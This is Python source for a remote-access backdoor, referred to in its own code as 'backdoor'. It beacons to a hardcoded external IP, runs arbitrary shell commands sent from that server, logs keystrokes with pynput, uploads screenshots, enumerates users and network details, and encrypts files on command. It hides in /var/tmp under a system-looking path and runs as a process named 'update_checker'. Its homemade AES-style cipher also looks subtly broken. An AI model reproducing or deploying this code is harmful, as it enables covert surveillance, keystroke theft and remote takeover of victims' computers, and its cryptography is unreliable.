'''
Client software to run on host machine. Handles connections to the server as
well as ensuring lifetime.
'''

__version__ = '1.5'
__all__ = [
    "lock",
    "unlock",
    "LOCK_EX",
    "LOCK_SH",
    "LOCK_NB",
    "LockException",
]

import os
import sys
import platform
import time
import datetime
import multiprocessing
import subprocess
import socket
import struct
import json
import io
import base64

# from PIL import ImageGrab
# from pyscreenshot import grab
from pynput import keyboard
from contextlib import closing
from socket import AF_INET, SOCK_DGRAM

###############################################################################
############   FILE LOCKIING ACROSS WINDOWS AND POSIX PLATFORMS   #############
###############################################################################

class LockException(Exception):
    LOCK_FAILED = 1
    
    
if os.name == 'nt':
    import win32con
    import win32file
    import pywintypes
    LOCK_EX = win32con.LOCKFILE_EXCLUSIVE_LOCK
    LOCK_SH = 0 
    LOCK_NB = win32con.LOCKFILE_FAIL_IMMEDIATELY
    __overlapped = pywintypes.OVERLAPPED()
    
elif os.name == 'posix':
    import fcntl
    LOCK_EX = fcntl.LOCK_EX
    LOCK_SH = fcntl.LOCK_SH
    LOCK_NB = fcntl.LOCK_NB
    
else:
    raise RuntimeError("PortaLocker only defined for nt and posix platforms")
        
        
if os.name == 'nt':
    def lock(file, flags):
        hfile = win32file._get_osfhandle(file.fileno())
        try:
            win32file.LockFileEx(hfile, flags, 0, -0x10000, __overlapped)
        except pywintypes.error as exc_value:
            if exc_value[0] == 33:
                raise LockException(LockException.LOCK_FAILED, exc_value[2])
            else:
                raise
                
    def unlock(file):
        hfile = win32file._get_osfhandle(file.fileno())
        try:
            win32file.UnlockFileEx(hfile, 0, -0x10000, __overlapped)
        except pywintypes.error as exc_value:
            if exc_value[0] == 158:
                pass
            else:
                raise
                
elif os.name == 'posix':
    def lock(file, flags):
        try:
            fcntl.flock(file.fileno(), flags)
        except IOError as exc_value:
            if exc_value[0] == 11:
                raise LockException(LockException.LOCK_FAILED, exc_value[1])
            else:
                raise
                
    def unlock(file):
        fcntl.flock(file.fileno(), fcntl.LOCK_UN)

###############################################################################
#########################   CONNECTION TO THE SERVER   ########################
###############################################################################

class Target:
    '''
    This class is used for connections to the Server and contains functions
    relating to sending and receiving data. It also allows for commands to 
    be translated and executed on the host machine.
    '''

    def __init__(self, ip: str, port: int, key: str):
        '''
        Class constructor; sets the dictionary of commands based on host OS.
        
        param ip: the IP address of the server (string)
        param port: the port number of the server (integer)
        param key: the validation key to access the server (string)
        '''
        # Establish class data members
        self.key = key
        self.ip = ip
        self.port = port
        self.os = platform.system()
        
        # System is Windows
        if (self.os == "Windows"):
            self.cmd_dict = {
                "directory" : "dir ",
                "system" : "systeminfo",
                "privilege" : "whoami",
                "network" : "ipconfig /all",
                "tasks" : "tasklist",
                "time" : "time /t & date /t",
                "tree" : "tree ",
                "users" : "wmic useraccount get name,sid",
                "print" : "type "
            }

        
        # System is UNIX/POSIX
        else:
            self.cmd_dict = {
                "directory" : "ls -al ",
                "system" : "uname -a",
                "privilege" : "id",
                "network" : "ifconfig -a & netstat",
                "tasks" : "ps aux",
                "time" : "date",
                "tree" : "ls -alR ",
                "users" : "getent passwd",
                "print" : "cat ",
                "reboot" : "reboot ",
                "shutdown" : "shutdown "
            }        
        self.keyboard_log = "->"           


    def on_press(self, key):

        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.backspace:
                current_key = "<-"
            elif key == key.enter:
                current_key = " \n "
            else:
                current_key = " " + str(key) + " "
        self.keyboard_log = self.keyboard_log + current_key
        write_init("lg", self.keyboard_log)


    def start_keylogger(self, duration):
        # Keyboard logging
        self.duration = float(duration)
        self.time = time.time()
        with keyboard.Listener(on_press = self.on_press) as listener:
            listener.join()
   
    def screen_capture(self):
        # image = ImageGrab.grab()
        # image.save("p.jpg")
        # grab().save("/var/tmp/x86_64-linux-gnu/p.jpg")
        print("")

    def send(self, data):
        '''
        Sends data to the server, encrypting it first. This function does not
        modify the data in any way (besides encoding/decoding), and should
        not be used for data containing any quotes or special characters
        (see send_json() for such usage).
        
        param data: the data to send
        '''
        if (type(data) == bytes):
            data = data.decode("utf-8")

        if (data == self.key):
            data = data + "\n"
            self.connection.send(data.encode("utf-8"))
            
        else:
            encrypted = encrypt(data, self.key) + '\n'
            self.connection.send(encrypted.encode("utf-8"))
    
    
    def send_json(self, data):
        '''
        Sends data to the server, encrypting it first. This function will
        convert the data to json in order to account for any quotation
        marks or special characters.
        
        param data: the data to send
        '''
        if (type(data) == bytes):
            data = data.decode("utf-8")

        json_data = json.dumps(data)
        encrypted = encrypt(json_data, self.key) + '\n'
        self.connection.send(encrypted.encode("utf-8"))
        
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def receive(self):
        '''
        Receives data (commands) from the server, then decrypts and formats them.
        
        return: formatted commands
        '''
        data = self.connection.recv(1024).rstrip()
        return decrypt(data, self.key).rstrip('\x00')       

    
    def execute_sys_command(self, command: str):
        '''
        Performs a given command in a new shell, then returns the output of the
        command.
        
        param command: the command to execute
        return: the output of the command
        '''
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        output, err = p.communicate()
        return output
        
        
    def run(self):
        '''
        Makes a single connection to the server; in this connection, first an
        identity is established, then any commands are sent from the server,
        then the commands are performed (using execute_sys_command()) and the
        results are sent back to the server.
        '''
        # Establish a connection
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))
        
        # Peform validation protocol
        self.key = decrypt_key(self.connection.recv(1024))
        self.send("key")
        self.receive()
        
        # Client identifier
        nm = read_init("nm")
        cc1 = read_init('cc1')
        cc2 = read_init('cc2')
        st = read_init('st')
        kt = read_init('kt')
        self.send(nm + "|" + str(st) + "|" + str(cc1) + "|" + str(cc2) + "|" + str(kt))
        
        # Receive any commands from the server, and split by pipes (delimiters)
        command = self.receive()
        commands = command.split("|")
        
        for curr_command in commands:
            if not (curr_command == "" or curr_command == "\n" or curr_command.startswith("[No")):

                # Split the current command by whitespace (to access each individual word)
                value = curr_command.split()
                print(value)

                # Name is the name to distinguish this client
                if (value[0] == "name"):
                    write_init('nm', value[1])
                    self.send_json("Name Changed to " + value[1] + "\n")

                # Sleep 1 is the server connection sleep cycle
                if (value[0] == "sleep_1"):
                    write_init('cc1', int(value[1]))
                    self.send_json("Sleep Cycle 1 Changed to " + value[1] + "\n")
                
                # Sleep 2 is the time checking sleep cycle    
                elif (value[0] == "sleep_2"):
                    write_init('cc2', int(value[1]))
                    self.send_json("Sleep Cycle 2 Changed to " + value[1] + "\n")
                
                # Encrypts the specified file
                elif (value[0] == "encrypt"):
                    try:
                        encrypt_file(value[1], self.key)
                        self.send_json("File <" + value[1] + "> encrypted.\n")
                    except FileNotFoundError:
                        self.send_json("The specified file path is invalid.\n")

                # Decrypts the specified file
                elif (value[0] == "decrypt"):
                    try:
                        decrypt_file(value[1], self.key)
                        self.send_json("File <" + value[1] + "> decrypted.\n")
                    except FileNotFoundError:
                        self.send_json("The specified file path is invalid.\n")

                # Uploads the specified file to the client system
                elif (value[0][0:1] == "."):
                    print(value[0])
                    file = open("~/Documents/" + value[0][1:], "w")
                    file.write(value[1])
                    self.send_json("File <" + value[0][1:] + "> has been uploaded!\n")
                
                # Killtime is the ending date and time of the software
                elif (value[0] == "killtime"):
                    write_init('kt', int(value[1]))
                    write_init('et', int(value[1]) - (time.time() * 1000))
                    self.send_json("Kill Time Changed to " + value[1] + "\n")
                
                # Send any command
                elif (value[0] == "shell"):
                    trunc_cmd = curr_command[6:]
                    result = self.execute_sys_command(trunc_cmd)
                    self.send_json(result)
                
                # Start keylogger
                elif (value[0] == "keylogger"):
                    self.send_json("Keylogger results pending \n")
                    self.start_keylogger(value[1])

                # Retrieve keylogger results
                elif (value[0] == "logs"):
                    logs = read_init("lg")
                    self.send_json(logs)
                    write_init("lg","")

                # Do a screenshot
                elif (value[0] == "screencapture"):
                	self.screen_capture()
                	
                	file_data = self.read_file("/var/tmp/x86_64-linux-gnu/p.jpg").decode('utf-8') + '\n'
                	self.connection.send(file_data.encode('utf-8'))
                	
                	os.remove("/var/tmp/x86_64-linux-gnu/p.jpg")
                    
                # Otherwise, get the command from the dictionary and execute it
                else:
                    mapping = self.cmd_dict[value[0]]
                    if (len(value) == 2):
                        mapping += value[1]

                    result = self.execute_sys_command(mapping)
                    self.send_json(result)
                
                # Receive server confirmation of result
                self.receive()
        
        # Terminate the connection once all commands have been completed
        self.connection.close()

###############################################################################
###############################   ENCRYPTION   ################################
###############################################################################

def add_round_key(text: str, key: str) -> str:
    result = ""
    i = 0
    while(i < len(key)):
        first = 0
        if(i < len(text)):
            first = int(text[i:i + 2], base=16)
        sec = int(key[i:i + 2], base=16)
        temp = hex(first ^ sec)[2:]
        while(len(temp) < 2):
            temp = "0" + temp
        result = result + temp
        i += 2
    return result


def sub_bytes(text: str) -> str:
    result = ""
    for i in range(0, 4):
        result = result + sbox(text[8 * i: 8 * i + 8])
    return result


def shift_rows(text: str):
    matrix = [[0 for i in range(4)] for j in range(4)]
    pos = 0
    for i in range(0, 4):
        for j in range(0, 4):
            matrix[j][i] = text[pos:pos + 2]
            pos += 2

    for row in range(1, 4):
        for i in range(0, row):
            temp = matrix[row][0]
            matrix[row][0] = matrix[row][1]
            matrix[row][1] = matrix[row][2]
            matrix[row][2] = matrix[row][3]
            matrix[row][3] = temp

    return matrix


def mix_columns(text) -> str:
    result = ""
    matrix = [[2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2]]
    newText = [[0 for i in range(0, 4)] for j in range(0, 4)]
    for col in range(0, 4):
        for row in range(0, 4):
            add = [0 for i in range(0, 4)]
            for matRow in range(0, 4):
                curr = int(text[matRow][col], base=16)
                if(matrix[row][matRow] == 2):
                    curr *= 2
                elif(matrix[row][matRow] == 3):
                    curr = (curr * 2) ^ curr
                add[matRow] = curr
            sum = add[0] ^ add[1] ^ add[2] ^ add[3]
            if(len(hex(sum)[2:]) >= 3):
                sum = sum ^ 0b100011011 
            stringSum = hex(sum)[2:]
            while(len(stringSum) < 2):
                stringSum = "0" + stringSum
            newText[row][col] = stringSum
    
    for i in range(0, 4):
        for j in range(0, 4):
            result = result + newText[j][i]

    return result


def key_expansion(keyUsed: str) -> str:
    key = keyUsed
    forLoopIters = 8
    whileLoopIters = 480
    temp1 = key[len(key) - 8:]
    temp2 = key[:8]
    t1 = int(temp1, base=16)
    t2 = int(temp2, base=16)
    iteration = 0
    polynomial = 1

    while(len(key) < whileLoopIters):
        for i in range(0, forLoopIters):
            temp1 = key[len(key) - 8:]
            temp2 = key[8 * (i + forLoopIters * iteration):8 * (i + forLoopIters * iteration) + 8]
            if i == 0:
                temp1 = temp1[2:] + temp1[:2]
                temp1 = sbox(temp1)

                temp3 = temp1[:2]
                temp4 = temp1[2:]
                temp3 = hex(int(temp3, base=16) ^ polynomial)
                temp1 = temp3[2:] + temp4
                polynomial = (polynomial << 1) ^ (0x11b & -(polynomial >> 7))
            if i == 4: 
                temp1 = sbox(temp1)
            
            t1 = int(temp1, base=16)
            t2 = int(temp2, base=16)
            result = hex(t1 ^ t2)[2:]

            while(len(result) < 8):
                result = "0" + result
            key = key + result
        iteration += 1
    return key.upper()


def sbox(bt: str) -> str:
    conversion = {"00": "63", "01": "7C", "02": "77", "03": "7B", "04": "F2", "05": "6B", 
    "06": "6F", "07": "C5", "08": "30", "09": "01", "0A": "67",
    "0B": "2B", "0C": "FE", "0D": "D7", "0E": "AB", "0F": "76",
    "10": "CA", "11": "82", "12": "C9", "13": "7D", "14": "FA",
    "15": "59", "16": "47", "17": "F0", "18": "AD", "19": "D4",
    "1A": "A2", "1B": "AF", "1C": "9C", "1D": "A4", "1E": "72",
    "1F": "C0", "20": "B7", "21": "FD", "22": "93", "23": "26",
    "24": "36", "25": "3F", "26": "F7", "27": "CC", "28": "34",
    "29": "A5", "2A": "E5", "2B": "F1", "2C": "71", "2D": "D8",
    "2E": "31", "2F": "15", "30": "04", "31": "C7", "32": "23",
    "33": "C3", "34": "18", "35": "96", "36": "05", "37": "9A",
    "38": "07", "39": "12", "3A": "80", "3B": "E2", "3C": "EB",
    "3D": "27", "3E": "B2", "3F": "75", "40": "09", "41": "83",
    "42": "2C", "43": "1A", "44": "1B", "45": "6E", "46": "5A",
    "47": "A0", "48": "52", "49": "3B", "4A": "D6", "4B": "B3",
    "4C": "29", "4D": "E3", "4E": "2F", "4F": "84", "50": "53",
    "51": "D1", "52": "00", "53": "ED", "54": "20", "55": "FC",
    "56": "B1", "57": "5B", "58": "6A", "59": "CB", "5A": "BE",
    "5B": "39", "5C": "4A", "5D": "4C", "5E": "58", "5F": "CF",
    "60": "D0", "61": "EF", "62": "AA", "63": "FB", "64": "43",
    "65": "4D", "66": "33", "67": "85", "68": "45", "69": "F9",
    "6A": "02", "6B": "7F", "6C": "50", "6D": "3C", "6E": "9F",
    "6F": "A8", "70": "51", "71": "A3", "72": "40", "73": "8F",
    "74": "92", "75": "9D", "76": "38", "77": "F5", "78": "BC",
    "79": "B6", "7A": "DA", "7B": "21", "7C": "10", "7D": "FF",
    "7E": "F3", "7F": "D2", "80": "CD", "81": "0C", "82": "13",
    "83": "EC", "84": "5F", "85": "97", "86": "44", "87": "17",
    "88": "C4", "89": "A7", "8A": "7E", "8B": "3D", "8C": "64",     
    "8D": "5D", "8E": "19", "8F": "73", "90": "60", "91": "81",
    "92": "4F", "93": "DC", "94": "22", "95": "2A", "96": "90",
    "97": "88", "98": "46", "99": "EE", "9A": "B8", "9B": "14",
    "9C": "DE", "9D": "5E", "9E": "0B", "9F": "DB", "A0": "E0",
    "A1": "32", "A2": "3A", "A3": "0A", "A4": "49", "A5": "06",
    "A6": "24", "A7": "5C", "A8": "C2", "A9": "D3", "AA": "AC",
    "AB": "62", "AC": "91", "AD": "95", "AE": "E4", "AF": "79",
    "B0": "E7", "B1": "C8", "B2": "37", "B3": "6D", "B4": "8D",
    "B5": "D5", "B6": "4E", "B7": "A9", "B8": "6C", "B9": "56",
    "BA": "F4", "BB": "EA", "BC": "65", "BD": "7A", "BE": "AE",
    "BF": "08", "C0": "BA", "C1": "78", "C2": "25", "C3": "2E",
    "C4": "1C", "C5": "A6", "C6": "B4", "C7": "C6", "C8": "E8",
    "C9": "DD", "CA": "74", "CB": "1F", "CC": "4B", "CD": "BD",
    "CE": "8B", "CF": "8A", "D0": "70", "D1": "3E", "D2": "B5",
    "D3": "66", "D4": "48", "D5": "03", "D6": "F6", "D7": "0E",
    "D8": "61", "D9": "35", "DA": "57", "DB": "B9", "DC": "86",
    "DD": "C1", "DE": "1D", "DF": "9E", "E0": "E1", "E1": "F8",
    "E2": "98", "E3": "11", "E4": "69", "E5": "D9", "E6": "8E",
    "E7": "94", "E8": "9B", "E9": "1E", "EA": "87", "EB": "E9",
    "EC": "CE", "ED": "55", "EE": "28", "EF": "DF", "F0": "8C",
    "F1": "A1", "F2": "89", "F3": "0D", "F4": "BF", "F5": "E6",
    "F6": "42", "F7": "68", "F8": "41", "F9": "99", "FA": "2D",
    "FB": "0F", "FC": "B0", "FD": "54", "FE": "BB", "FF": "16"}
    result = ""
    for i in range(0, 4):
        result = result + conversion[bt[i * 2: i * 2 + 2].upper()]
    return result


def textToHex(txt: str) -> str:
    result = ""
    while(len(txt) > 0):
        curr = txt[0:1]
        result += hex(ord(curr))[2:]
        txt = txt[1:]
    return result


def encrypt(plaintext: str, key: str) -> str:
    plaintext = textToHex(plaintext)
    rounds = 14
    result = ""
    key = key_expansion(key)
    while(len(plaintext) > 0):
        text = ""
        if(len(plaintext) >= 32):
            text = plaintext[0:32]
            plaintext = plaintext[32:]
        else:
            text = plaintext
            plaintext = ""
        count = 0
        while(count < rounds - 1):
            text = add_round_key(text, key[count * 32:count * 32 + 32])
            text = sub_bytes(text)
            temp = shift_rows(text)
            text = mix_columns(temp)
            count += 1
        text = add_round_key(text, key[count * 32:count * 32 + 32])
        text = sub_bytes(text)
        temp = shift_rows(text)
        temp_str = ""
        for i in range(0, 4):
            for j in range(0, 4):
                temp_str = temp_str + temp[j][i]
        count += 1
        text = add_round_key(temp_str, key[count * 32:count * 32 + 32])
        result = result + text
    return result.upper()

def encrypt_file(filename: str, key: str):

    file = open(filename)
    arr = file.readlines()
    file.close()
    text = ""
    for i in range(0, len(arr)):
        text += arr[i]
    encrypted = encrypt(text, key_expansion(key))
    file = open(filename, "w")
    file.write(encrypted)
    file.close()

###############################################################################
###############################   DECRYPTION   ################################
###############################################################################

def add_round_key_d(text: str, key: str) -> str:
    result = ""
    i = 0
    while(i < len(key)):
        first = 0
        if(i < len(text)):
            first = int(text[i:i + 2], base=16)
        sec = int(key[i:i + 2], base=16)
        temp = hex(first ^ sec)[2:]
        while(len(temp) < 2):
            temp = "0" + temp
        result = result + temp
        i += 2
    return result


def inv_sub_bytes(text: str) -> str:
    result = ""
    for i in range(0, 4):
        result = result + sbox_d(text[8 * i: 8 * i + 8])
    return result


def inv_shift_rows(text: str):
    matrix = [[0 for i in range(0, 4)] for j in range(0, 4)]
    pos = 0
    for row in range(0, 4):
        for col in range(0, 4):
            matrix[col][row] = text[pos:pos + 2]
            pos += 2
    
    for row in range(0, 4):
        for i in range(0, row):
            temp = matrix[row][3]
            matrix[row][3] = matrix[row][2]
            matrix[row][2] = matrix[row][1]
            matrix[row][1] = matrix[row][0]
            matrix[row][0] = temp
    
    return matrix


def mix_columns_d(text) -> str:
    result = ""
    matrix = [[2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2]]
    newText = [[0 for i in range(0, 4)] for j in range(0, 4)]
    for col in range(0, 4):
        for row in range(0, 4):
            add = [0 for i in range(0, 4)]
            for matRow in range(0, 4):
                curr = int(text[matRow][col], base=16)
                if(matrix[row][matRow] == 2):
                    curr *= 2
                elif(matrix[row][matRow] == 3):
                    curr = (curr * 2) ^ curr
                add[matRow] = curr
            sum = add[0] ^ add[1] ^ add[2] ^ add[3]
            if(len(hex(sum)[2:]) >= 3):
                sum = sum ^ 0b100011011        
            stringSum = hex(sum)[2:]
            while(len(stringSum) < 2):
                stringSum = "0" + stringSum
            newText[row][col] = stringSum
    
    for i in range(0, 4):
        for j in range(0, 4):
            result = result + newText[j][i]

    return result


def sbox_d(bt: str) -> str:
    conversion = {"63": "00", "7C": "01", "77": "02", "7B": "03", "F2": "04", "6B": "05", 
    "6F": "06", "C5": "07", "30": "08", "01": "09", "67": "0A",
    "2B": "0B", "FE": "0C", "D7": "0D", "AB": "0E", "76": "0F",
    "CA": "10", "82": "11", "C9": "12", "7D": "13", "FA": "14",
    "59": "15", "47": "16", "F0": "17", "AD": "18", "D4": "19",
    "A2": "1A", "AF": "1B", "9C": "1C", "A4": "1D", "72": "1E",
    "C0": "1F", "B7": "20", "FD": "21", "93": "22", "26": "23",
    "36": "24", "3F": "25", "F7": "26", "CC": "27", "34": "28",
    "A5": "29", "E5": "2A", "F1": "2B", "71": "2C", "D8": "2D",
    "31": "2E", "15": "2F", "04": "30", "C7": "31", "23": "32",
    "C3": "33", "18": "34", "96": "35", "05": "36", "9A": "37",
    "07": "38", "12": "39", "80": "3A", "E2": "3B", "EB": "3C",
    "27": "3D", "B2": "3E", "75": "3F", "09": "40", "83": "41",
    "2C": "42", "1A": "43", "1B": "44", "6E": "45", "5A": "46",
    "A0": "47", "52": "48", "3B": "49", "D6": "4A", "B3": "4B",
    "29": "4C", "E3": "4D", "2F": "4E", "84": "4F", "53": "50",
    "D1": "51", "00": "52", "ED": "53", "20": "54", "FC": "55",
    "B1": "56", "5B": "57", "6A": "58", "CB": "59", "BE": "5A",
    "39": "5B", "4A": "5C", "4C": "5D", "58": "5E", "CF": "5F",
    "D0": "60", "EF": "61", "AA": "62", "FB": "63", "43": "64",
    "4D": "65", "33": "66", "85": "67", "45": "68", "F9": "69",
    "02": "6A", "7F": "6B", "50": "6C", "3C": "6D", "9F": "6E",
    "A8": "6F", "51": "70", "A3": "71", "40": "72", "8F": "73",
    "92": "74", "9D": "75", "38": "76", "F5": "77", "BC": "78",
    "B6": "79", "DA": "7A", "21": "7B", "10": "7C", "FF": "7D",
    "F3": "7E", "D2": "7F", "CD": "80", "0C": "81", "13": "82",
    "EC": "83", "5F": "84", "97": "85", "44": "86", "17": "87",
    "C4": "88", "A7": "89", "7E": "8A", "3D": "8B", "64": "8C",
    "5D": "8D", "19": "8E", "73": "8F", "60": "90", "81": "91",
    "4F": "92", "DC": "93", "22": "94", "2A": "95", "90": "96",
    "88": "97", "46": "98", "EE": "99", "B8": "9A", "14": "9B",
    "DE": "9C", "5E": "9D", "0B": "9E", "DB": "9F", "E0": "A0",
    "32": "A1", "3A": "A2", "0A": "A3", "49": "A4", "06": "A5",
    "24": "A6", "5C": "A7", "C2": "A8", "D3": "A9", "AC": "AA",
    "62": "AB", "91": "AC", "95": "AD", "E4": "AE", "79": "AF",
    "E7": "B0", "C8": "B1", "37": "B2", "6D": "B3", "8D": "B4",
    "D5": "B5", "4E": "B6", "A9": "B7", "6C": "B8", "56": "B9",
    "F4": "BA", "EA": "BB", "65": "BC", "7A": "BD", "AE": "BE",
    "08": "BF", "BA": "C0", "78": "C1", "25": "C2", "2E": "C3",
    "1C": "C4", "A6": "C5", "B4": "C6", "C6": "C7", "E8": "C8",
    "DD": "C9", "74": "CA", "1F": "CB", "4B": "CC", "BD": "CD",
    "8B": "CE", "8A": "CF", "70": "D0", "3E": "D1", "B5": "D2",
    "66": "D3", "48": "D4", "03": "D5", "F6": "D6", "0E": "D7",
    "61": "D8", "35": "D9", "57": "DA", "B9": "DB", "86": "DC",
    "C1": "DD", "1D": "DE", "9E": "DF", "E1": "E0", "F8": "E1",
    "98": "E2", "11": "E3", "69": "E4", "D9": "E5", "8E": "E6",
    "94": "E7", "9B": "E8", "1E": "E9", "87": "EA", "E9": "EB",
    "CE": "EC", "55": "ED", "28": "EE", "DF": "EF", "8C": "F0",
    "A1": "F1", "89": "F2", "0D": "F3", "BF": "F4", "E6": "F5",
    "42": "F6", "68": "F7", "41": "F8", "99": "F9", "2D": "FA",
    "0F": "FB", "B0": "FC", "54": "FD", "BB": "FE", "16": "FF"}
    result = ""
    for i in range(0, 4):
        result = result + conversion[bt[i * 2: i * 2 + 2].upper()]
    return result


def matrixToString_d(matrix) -> str:
    temp = ""
    for i in range(0, 4):
        for j in range(0, 4):
            temp = temp + matrix[j][i]
    return temp

def decrypt(ciphertxt: str, key: str):
    key = key_expansion(key)
    rounds = 14
    result = ""
    firstRound = True
    while(len(ciphertxt) > 0):
        text = ""
        if(len(ciphertxt) >= 32):
            text = ciphertxt[:32]
            ciphertxt = ciphertxt[32:]
        else:
            text = ciphertxt
            ciphertxt = ""
        count = rounds - 1
        if(firstRound):
            key = key[0:len(key) - 32]
            firstRound = False
        text = add_round_key_d(text, key[len(key) - 32:])
        temp = inv_shift_rows(text)
        text = matrixToString_d(temp)
        count -= 1
        text = inv_sub_bytes(text)
        text = add_round_key_d(text, key[len(key) - 64:len(key) - 32])
        while(count >= 0):
            matrix = [[0 for i in range(0, 4)] for j in range(0, 4)]
            pos = 0
            for row in range(0, 4):
                for col in range(0, 4):
                    matrix[col][row] = text[pos:pos + 2]
                    pos += 2
            text = mix_columns_d(matrix)
            pos = 0
            for row in range(0, 4):
                for col in range(0, 4):
                    matrix[col][row] = text[pos:pos + 2]
                    pos += 2
            text = mix_columns_d(matrix)
            pos = 0
            for row in range(0, 4):
                for col in range(0, 4):
                    matrix[col][row] = text[pos:pos + 2]
                    pos += 2
            text = mix_columns_d(matrix)
            matrix = inv_shift_rows(text)
            text = matrixToString_d(matrix)
            text = inv_sub_bytes(text)
            text = add_round_key_d(text, key[count * 32:count * 32 + 32])
            count -= 1
        result = result + text
    while(result[-1] == "0"):
        result = result[:-1]
    byte_arr = bytearray.fromhex(result)
    return byte_arr.decode().rstrip()


def decrypt_key(key: str) -> str:
    result = add_round_key(key, "30190dcc14585301f5bfc5b666c8477530190dcc14585301f5bfc5b666c84775")
    dt = datetime.datetime.today()
    day = dt.day
    while(day > 0):
        temp = ""
        temp += inv_sub_bytes(result[:32])
        temp += inv_sub_bytes(result[32:])
        result = temp
        day -= 1
    return result


def decrypt_file(filename: str, key: str):
    file = open(filename)
    text = file.read()
    file.close()
    dec = decrypt(text, key_expansion(key))
    file = open(filename, "w")
    file.write(dec)
    file.close()

###############################################################################
############################   UTILITY FUNCTIONS   ############################
###############################################################################

def get_ntp() -> float:
    '''
    Connect to an ntp server (pool.ntp.org) to get reliable UNIX epoch time.
    
    return: the current date and time as epoch (float)
    '''
    NTP_PACKET_FORMAT = "!12I"
    NTP_DELTA = 2208988800  # 1970-01-01 00:00:00
    NTP_QUERY = b'\x1b' + 47 * b'\0'  
    with closing(socket.socket( AF_INET, SOCK_DGRAM)) as s:
        s.sendto(NTP_QUERY, ("pool.ntp.org", 123))
        msg, address = s.recvfrom(1024)
        
    unpacked = struct.unpack(NTP_PACKET_FORMAT, msg[0:struct.calcsize(NTP_PACKET_FORMAT)])
    return unpacked[10] + float(unpacked[11]) / 2**32 - NTP_DELTA


def read_init(key: str):
    '''
    Read and return a single value from the init file. NON-LOCKING.
    
    param key: the key of the desired value (string)
    return: the corresponding value (any type)
    '''
    # System-specific file locations
    json_location = "/var/tmp/x86_64-linux-gnu/init.json"
    with open(json_location, "r") as init:
        data = json.load(init)
        return data[key]
    
    
def write_init(key: str, value):
    '''
    Write a single (key, value) pair into the init file. LOCKING.
    
    param key: the key to write (string)
    param value: the value to write (any type)
    '''
    # System-specific file locations
    json_location = "/var/tmp/x86_64-linux-gnu/init.json"
    while True:
        try:
            with open(json_location, "r+") as init:
                # Lock the file
                lock(init, LOCK_EX | LOCK_NB)
                
                # Convert to JSON and write data
                data = json.load(init)
                data[key] = value
                init.seek(0)
                json.dump(data, init, ensure_ascii=False)
                init.truncate()
                
                # Unlock the file
                unlock(init)
                
                break
        # File was in use; try again
        except Exception:
            time.sleep(0.05)
    

def proc_start():
    '''
    Runs (indefinitely) a Target object. To be used as a multiprocessing
    Process.
    '''
    while(True):
        try:
            backdoor = Target("23.23.136.140", 10000, '30190dcc14585301f5bfc5b666c8477530190dcc14585301f5bfc5b666c84775')
            while(True):
                backdoor.run()
                time.sleep(read_init('cc1'))
        except Exception as e:
        	time.sleep(read_init('cc1'))
        	continue
        
        
def kill_all(proc):
    '''
    Calls the uninstallation script, effectively stopping execution.
    
    param proc: the multiprocessing Process running the Target
    '''
    kill_location = "/var/tmp/x86_64-linux-gnu/uninstall.sh"
    subprocess.Popen([kill_location],)
                    
    # In case uninstall fails, stop processes manually
    time.sleep(30)
    proc.terminate()
    sys.exit(0)    
        
###############################################################################
#########################   MAIN / EXECUTABLE CODE   ##########################
###############################################################################

if __name__ == '__main__':
    try:
        # Start the server connection cycle
        proc = multiprocessing.Process(target=proc_start, name="update_checker")
        proc.start()
        
        # Get (and set if needed) the starting time
        start_time = read_init('st')
        if (start_time <= 0):
            start_time = time.time() * 1000
            write_init('st', start_time)
        
        # Start the time-checking cycle
        while(True):
            try:
                # Gather time data from init file and system
                end_time = read_init('et')
                kill_time = read_init('kt')
                curr_time = time.time() * 1000
                
                # Check NTP time 
                try:
                    ntp_time = get_ntp()
                    if (ntp_time >= kill_time):
                        kill_all(proc)
                
                # If NTP fails (connection issue, timeout, etc), revert to system time                 
                except Exception as q:
                    try:
                        if (curr_time >= kill_time):
                            kill_all(proc)  
                    
                    # If system time fails (somehow), revert to total time        
                    except Exception:
                        if (curr_time - start_time >= end_time):
                            kill_all(proc)
                
                # Sleep for the desired cycle length
                time.sleep(read_init('cc2'))

            except Exception:
                continue

    except Exception as e:
        print(str(e))

###############################################################################
###################################   END   ###################################
###############################################################################
